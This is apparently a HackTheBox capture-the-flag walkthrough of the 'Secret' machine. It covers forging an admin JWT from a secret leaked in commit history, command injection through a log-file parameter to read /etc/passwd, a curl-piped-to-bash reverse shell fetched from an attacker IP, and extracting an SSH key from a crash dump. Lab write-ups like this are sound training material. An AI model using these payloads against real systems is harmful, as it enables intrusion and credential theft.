# Secret

![Secret.png](Secret/Secret.png)

### 10/30/2021

[https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)

[https://infosecwriteups.com/celestial-a-node-js-deserialization-hackthebox-walk-through-c71a4da14eaa](https://infosecwriteups.com/celestial-a-node-js-deserialization-hackthebox-walk-through-c71a4da14eaa)

Default Network mapper scan to discover open ports on host:

![Untitled](Secret/Untitled.png)

SSH service open port

Hyper text transfer protocol port

3000 HTTP Node JS middleware open port - Is a web framework that has minimal functionality of its own. Middleware can change information

![Untitled](Secret/Untitled%201.png)

Application without subdomains:

![Untitled](Secret/Untitled%202.png)

Initial page in the 3000 port:

![Untitled](Secret/Untitled%203.png)

Ok, we have an API, and a location to register user:

![Untitled](Secret/Untitled%204.png)

Testing request methods on API:

![Untitled](Secret/Untitled%205.png)

Directorys:

![Untitled](Secret/Untitled%206.png)

Reading commit logs to find something useful:

![Untitled](Secret/Untitled%207.png)

Okay in this way we got a different response by the server:

![Untitled](Secret/Untitled%208.png)

![Untitled](Secret/Untitled%209.png)

![Untitled](Secret/Untitled%2010.png)

Set the correct content type to you can achieve the register page:

![Untitled](Secret/Untitled%2011.png)

Ok, now we get a user account:

![Untitled](Secret/Untitled%2012.png)

In the login page it sends a JWT token:

![Untitled](Secret/Untitled%2013.png)

Ok i receive the response in the normal port 80, probably the API's are linked:

![Untitled](Secret/Untitled%2014.png)

When we put a null character the server returns a error:

![Untitled](Secret/Untitled%2015.png)

The process of get the admin account token was: 

Reading the commit log in the file folder, i found a secret token that is used to generate a web token:

![Untitled](Secret/Untitled%2016.png)

Reading the code and how it creates a JWT token, i know that the token is the id, username and email, and it is processed by JWT token. 

![Untitled](Secret/Untitled%2017.png)

So, i get myself token:

![Untitled](Secret/Untitled%2018.png)

paste in the JWT generator, set the signature and change the name and email to admin credentials:

![Untitled](Secret/Untitled%2019.png)

It works successfully:

![Untitled](Secret/Untitled%2020.png)

![Untitled](Secret/Untitled%2021.png)

Reading more about how the server treat with the log file, i found the code in the commits history:

It receive file from request and executes with exec function in node js:

![Untitled](Secret/Untitled%2022.png)

The request reply our LFI

![Untitled](Secret/Untitled%2023.png)

Searching more about how to explore exec function in Node i found a article in this link:

[https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/](https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/)

Basically to it works just pass a name of a file and close the command:

```python
index.js;ls
index.js;whoami
```

![Untitled](Secret/Untitled%2024.png)

```python
GET /api/logs?file=index.js;cat%20/etc/passwd HTTP/1.1
Host: 10.10.11.120
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 2
Content-type: text/html
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgwMzg4NjNiNjJhOTA0NTgzN2MxYWQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM1Nzk1ODM0fQ.d2XZObmsEN1yreKYy5HIV_w3OAJ9YggwvH14Ka1bek8
```

![Untitled](Secret/Untitled%2025.png)

```python
http://10.10.11.120/api/logs?file=index.js;curl+http%3a//10.10.14.81%3a8000/shell.bash|bash
```

Reading the Strace of a binary, we can look at that it reads a file:

![Untitled](Secret/Untitled%2026.png)

Db credentials:

![Untitled](Secret/Untitled%2027.png)

![Untitled](Secret/Untitled%2028.png)

The machine register logs because the prctl are enabled. 

![Untitled](Secret/Untitled%2029.png)

We can try read this with apport-unpack

```python
apport-unpack
```

We must have to run the program and then generate a crash

![Untitled](Secret/Untitled%2030.png)

Crash file generated:

![Untitled](Secret/Untitled%2031.png)

Unpacking and accessing the folder:

![Untitled](Secret/Untitled%2032.png)

Id_rsa key:

![Untitled](Secret/Untitled%2033.png)